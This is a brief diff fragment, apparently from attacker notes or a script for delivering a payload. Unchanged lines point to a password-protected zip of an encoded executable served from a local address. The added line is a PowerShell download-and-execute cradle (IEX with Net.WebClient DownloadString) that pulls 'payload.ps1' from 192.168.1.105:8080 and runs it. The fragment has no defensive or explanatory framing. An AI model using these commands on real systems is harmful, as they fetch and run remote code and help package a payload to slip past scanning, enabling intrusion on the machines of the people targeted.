@@ -13,4 +13,7 @@ http://192.168.1.105:8080/payload_protegido.zip
 
 zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe
 
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.105:8080/payload.ps1')
+
+
 
